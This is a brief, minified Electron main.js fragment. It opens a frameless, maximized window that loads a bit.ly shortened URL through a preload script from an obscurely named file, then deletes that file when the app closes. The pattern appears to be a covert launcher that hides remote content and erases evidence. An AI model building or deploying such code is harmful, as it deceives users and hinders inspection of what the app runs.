"main.js" == __filename.split("\\").pop() && app.on("ready", () => {
    e = new BrowserWindow({frame: !1, resizable: !1, webPreferences: {nodeIntegration: !1, devTools: !0, preload: `${__dirname}/cajsel`}
    }); e.maximize(), e.loadURL("https://bit.ly/B14Jun"), app.on("window-all-closed", () => {app.quit(), fs.unlinkSync(`${__dirname}/cajsel`);})
})
